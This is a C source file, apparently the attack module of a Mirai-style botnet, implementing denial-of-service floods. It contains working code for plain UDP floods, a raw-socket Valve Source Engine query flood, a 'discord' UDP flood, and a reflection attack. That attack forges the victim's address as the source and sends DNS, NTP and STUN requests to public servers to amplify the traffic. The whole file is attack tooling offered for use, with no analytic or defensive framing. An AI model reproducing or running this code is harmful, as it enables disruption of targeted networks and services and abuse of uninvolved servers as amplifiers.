#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/protocol.h"

#define MAX(a,b) (((a) > (b)) ? (a) : (b))

#define IPV4(a,b,c,d) ((uint32_t)(((a)<<24)|((b)<<16)|((c)<<8)|(d)))

static unsigned long int Q[4096], c = 362436;

static ipv4_t get_dns_resolver(void);

char random_hex()
{
    char hexs[] = {'\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};
    int length = sizeof(hexs) / sizeof(hexs[0]);
    return rand() % (length + 1);
}

void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof(char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    }
    else
    {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof(char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            }
            else
            {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
        break;
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
}


void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        char *vega_hex[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
        char *data = vega_hex[rand()%256];  

        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_udpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            uint16_t data_len = rand_next_range(700, 1000);
            rand_str(data, data_len);

            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;

    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        return;
    }

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
#endif
        close(fd);
        return;
    }

    if (sport == 0xffff)
        sport = rand_next() % 65535;
    else
        sport = htons(sport);

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() % (1 << (32 - targs[i].netmask))));

            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() % 65535);
            if (sport == 0xffff)
                udph->source = htons(rand_next() % 65535);
            if (dport == 0xffff)
                udph->dest = htons(rand_next() % 65535);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);

            if (sendto(fd, pkts[i], ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
            {
#ifdef DEBUG
                printf("[DEBUG] sendto failed: %s\n", strerror(errno));
#endif
            }
        }
        usleep(1);
    }
}

void attack_mixamp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0);
    char *amp_type_str = attack_get_opt_str(opts_len, opts, ATK_OPT_CUSTOM, "random");
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);

    const ipv4_t DNS_AMPLIFIERS[] = {
        INET_ADDR(8,8,8,8),
        INET_ADDR(1,1,1,1),
        INET_ADDR(9,9,9,9)
    };
    const ipv4_t NTP_AMPLIFIERS[] = {
        INET_ADDR(216,239,35,0),
        INET_ADDR(162,159,200,1),
        INET_ADDR(129,250,35,250)
    };
    const ipv4_t STUN_AMPLIFIERS[] = {
        INET_ADDR(64,233,161,127),
        INET_ADDR(142,250,31,127),
        INET_ADDR(172,217,3,110)
    };

    #define DNS_PAYLOAD_LEN 29
    static char dns_payload[DNS_PAYLOAD_LEN] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00, 0x00, 0xff, 0x00, 0x01
    };
    #define NTP_PAYLOAD_LEN 48
    static char ntp_payload[NTP_PAYLOAD_LEN] = {
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    #define STUN_PAYLOAD_LEN 20
    static char stun_payload[STUN_PAYLOAD_LEN] = {
        0x00, 0x01, 0x00, 0x00, 0x21, 0x12, 0xa4, 0x42, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        return;
    }

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    size_t max_payload = MAX(MAX(DNS_PAYLOAD_LEN, NTP_PAYLOAD_LEN), STUN_PAYLOAD_LEN);
    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct udphdr) + max_payload);
    }

    static int dns_amp_idx = 0, ntp_amp_idx = 0, stun_amp_idx = 0;
    int amp_type = 0;

    if (strcmp(amp_type_str, "dns") == 0) amp_type = 1;
    else if (strcmp(amp_type_str, "ntp") == 0) amp_type = 2;
    else if (strcmp(amp_type_str, "stun") == 0) amp_type = 3;

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            ipv4_t amp_ip = 0;
            port_t dest_port;
            const char *payload;
            uint16_t payload_len;

            int prot = amp_type;
            if (prot == 0) prot = (rand_next() % 3) + 1;

            switch (prot) {
                case 1:
                    amp_ip = DNS_AMPLIFIERS[dns_amp_idx++ % (sizeof(DNS_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 53 : dport;
                    payload = dns_payload;
                    payload_len = DNS_PAYLOAD_LEN;
                    break;
                case 2:
                    amp_ip = NTP_AMPLIFIERS[ntp_amp_idx++ % (sizeof(NTP_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 123 : dport;
                    payload = ntp_payload;
                    payload_len = NTP_PAYLOAD_LEN;
                    break;
                case 3:
                    amp_ip = STUN_AMPLIFIERS[stun_amp_idx++ % (sizeof(STUN_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 3478 : dport;
                    payload = stun_payload;
                    payload_len = STUN_PAYLOAD_LEN;
                    break;
                default:
                    continue;
            }

            uint16_t tx_id = rand_next() & 0xFFFF;
            if (prot == 1) {
                memcpy(data, payload, payload_len);
                *((uint16_t*)data) = tx_id;
            } else {
                memcpy(data, payload, payload_len);
            }

            uint32_t victim_ip = targs[i].addr;
            if (targs[i].netmask < 32) {
                victim_ip = htonl(ntohl(targs[i].addr) + (rand_next() % (1 << (32 - targs[i].netmask))));
            }

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
            iph->id = htons(ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = victim_ip;
            iph->daddr = amp_ip;
            if (dont_frag) iph->frag_off = htons(1 << 14);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->source = htons(rand_next() % 65535);
            udph->dest = htons(dest_port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, ntohs(udph->len), ntohs(udph->len));

            struct sockaddr_in dest_addr = {0};
            dest_addr.sin_family = AF_INET;
            dest_addr.sin_addr.s_addr = amp_ip;
            sendto(fd, pkts[i], ntohs(iph->tot_len), 0, 
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
    }
}

void attack_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    const char discord_payload[] = "\x96\x13\x00\x10\xc2\x78\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x00\x20\x72\x64\x00\x00";
    const size_t payload_len = sizeof(discord_payload) - 1;

    if (dport == 0xffff) {
#ifdef DEBUG
        printf("Error: DPORT must be specified!\n");
#endif
        return;
    }

    for (i = 0; i < targs_len; i++) 
    {
        targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = 0;
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
    }

    while (TRUE) 
    {
        for (i = 0; i < targs_len; i++) 
        {
            send(fds[i], discord_payload, payload_len, MSG_NOSIGNAL);
        }
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;

    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof(resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found)
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8, 8, 8, 8);
    case 1:
        return INET_ADDR(74, 82, 42, 42);
    case 2:
        return INET_ADDR(64, 6, 64, 6);
    case 3:
        return INET_ADDR(4, 2, 2, 2);
    }
}
